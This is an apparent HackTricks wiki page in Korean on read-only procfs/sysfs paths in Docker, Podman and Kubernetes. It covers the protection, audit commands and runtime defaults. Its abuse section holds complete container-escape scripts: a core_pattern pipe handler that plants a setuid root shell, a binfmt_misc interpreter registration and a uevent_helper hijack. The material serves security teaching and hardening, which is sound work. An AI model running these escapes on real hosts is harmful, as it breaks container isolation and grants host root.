# 읽기 전용 시스템 경로

{{#include ../../../../banners/hacktricks-training.md}}

읽기 전용 시스템 경로는 마스킹된 경로와는 별개의 보호 수단입니다. 경로를 완전히 숨기기 대신, 런타임은 해당 경로를 노출하되 읽기 전용으로 마운트합니다. 이는 읽기 접근이 허용되거나 운영상 필요할 수 있지만 쓰기는 너무 위험한 일부 procfs 및 sysfs 위치에서 일반적입니다.

목적은 간단합니다: 많은 커널 인터페이스는 쓰기 가능해지면 훨씬 더 위험해집니다. 읽기 전용 마운트는 모든 정찰 가치를 제거하지는 않지만, 손상된 워크로드가 해당 경로를 통해 기저의 커널-대상 파일을 수정하는 것을 방지합니다.

## 동작

런타임은 종종 proc/sys 뷰의 일부를 읽기 전용으로 표시합니다. 런타임과 호스트에 따라 다음과 같은 경로가 포함될 수 있습니다:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

실제 목록은 다르지만 모델은 동일합니다: 필요할 때 가시성은 허용하고, 변경은 기본적으로 거부합니다.

## 실습

Docker에서 선언한 읽기 전용 경로 목록을 확인해보세요:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
컨테이너 내부에서 마운트된 proc/sys 뷰를 확인하세요:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

읽기 전용 시스템 경로는 호스트에 영향을 미치는 많은 종류의 악용을 제한합니다. 심지어 공격자가 procfs나 sysfs를 검사할 수 있더라도, 그곳에 쓸 수 없다면 커널 튜닝값(kernel tunables), 크래시 핸들러(crash handlers), 모듈 로딩 헬퍼(module-loading helpers) 또는 기타 제어 인터페이스와 관련된 많은 직접적인 수정 경로가 제거됩니다. 노출이 완전히 사라지는 것은 아니지만, 정보 노출에서 호스트 영향력으로의 전환은 더 어려워집니다.

## Misconfigurations

주요 실수는 민감한 경로의 마스크 해제(unmasking) 또는 읽기-쓰기(read-write)로의 리마운트(remounting), 쓰기 가능한 bind mounts로 호스트 proc/sys 내용을 직접 노출하는 것, 또는 런타임의 더 안전한 기본값을 사실상 우회하는 privileged 모드를 사용하는 것입니다. In Kubernetes, `procMount: Unmasked` and privileged workloads often travel together with weaker proc protection. 또 다른 흔한 운영 실수는 런타임이 보통 이 경로들을 읽기 전용으로 마운트하므로 모든 워크로드가 여전히 그 기본값을 상속한다고 가정하는 것입니다.

## Abuse

If the protection is weak, begin by looking for writable proc/sys entries:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
쓰기 가능한 항목이 있을 때, 가치 높은 후속 경로는 다음과 같습니다:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- `/proc/sys` 아래의 쓰기 가능한 항목들은 종종 container가 단순히 검사하는 것을 넘어 host kernel 동작을 수정할 수 있음을 의미합니다.
- `core_pattern`은 특히 중요합니다. 쓰기 가능한 host-facing 값은 파이프 핸들러를 설정한 뒤 프로세스를 crash 시켜 host code-execution 경로로 전환될 수 있기 때문입니다.
- `modprobe`는 kernel이 module-loading 관련 흐름에서 사용하는 helper를 드러냅니다; 쓰기 가능할 때 고전적인 고가치 표적입니다.
- `binfmt_misc`는 custom interpreter 등록이 가능한지 알려줍니다. 등록이 쓰기 가능하다면, 단순한 정보 leak이 아니라 execution primitive가 될 수 있습니다.
- `panic_on_oom`은 host-wide kernel 결정을 제어하므로 자원 고갈을 host denial of service로 바꿀 수 있습니다.
- `uevent_helper`는 writable sysfs helper 경로가 host-context execution을 유발하는 가장 명확한 예 중 하나입니다.

흥미로운 발견으로는 보통 read-only였어야 할 writable host-facing proc 설정값이나 sysfs 엔트리가 있습니다. 그 시점에서 workload는 제한된 container 관점에서 벗어나 의미 있는 kernel 영향력을 가지게 됩니다.

### Full Example: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
경로가 실제로 host kernel에 도달하면, payload는 host에서 실행되어 setuid shell을 남깁니다.

### 전체 예제: `binfmt_misc` 등록

`/proc/sys/fs/binfmt_misc/register`가 쓰기 가능하면, 사용자 정의 인터프리터 등록을 통해 일치하는 파일이 실행될 때 code execution이 발생할 수 있습니다:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
호스트에 노출된 쓰기 가능한 `binfmt_misc`에서는, 커널에서 트리거되는 인터프리터 경로에서 코드 실행이 발생합니다.

### 전체 예시: `uevent_helper`

만약 `/sys/kernel/uevent_helper`가 쓰기 가능하다면, 일치하는 이벤트가 발생했을 때 커널이 호스트 경로의 헬퍼를 호출할 수 있습니다:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
이것이 매우 위험한 이유는 헬퍼 경로가 안전한 컨테이너 전용 컨텍스트가 아니라 호스트 파일시스템 관점에서 해석되기 때문이다.

## 검사

이 검사들은 procfs/sysfs 노출이 기대한 대로 읽기 전용인지, 그리고 워크로드가 민감한 커널 인터페이스를 여전히 수정할 수 있는지 여부를 판단한다.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
여기서 흥미로운 점:

- 일반적인 하드닝된 워크로드는 아주 적은 수의 쓰기 가능한 /proc/sys 항목만 노출해야 한다.
- 쓰기 가능한 `/proc/sys` 경로는 일반적인 읽기 접근보다 더 중요할 때가 많다.
- 런타임이 경로를 읽기 전용이라고 표시하지만 실제로 쓰기가 가능하다면, mount propagation, bind mounts, and privilege settings을 주의 깊게 검토하라.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | 기본적으로 활성화됨 | Docker는 민감한 proc 항목에 대해 기본 읽기 전용 경로 목록을 정의한다 | 호스트 proc/sys 마운트 노출, `--privileged` |
| Podman | 기본적으로 활성화됨 | Podman은 명시적으로 완화하지 않는 한 기본 읽기 전용 경로를 적용한다 | `--security-opt unmask=ALL`, 광범위한 호스트 마운트, `--privileged` |
| Kubernetes | 런타임 기본값을 상속함 | Pod 설정이나 호스트 마운트로 약화되지 않는 한 기본 런타임의 읽기 전용 경로 모델을 사용한다 | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | 런타임 기본값 | 보통 OCI/runtime 기본값에 의존함 | Kubernetes 행과 동일; 직접 런타임 구성 변경으로 동작이 약화될 수 있음 |

핵심은 읽기 전용 시스템 경로가 보통 런타임 기본값으로 존재하지만, privileged modes 또는 host bind mounts로 쉽게 무력화될 수 있다는 점이다.
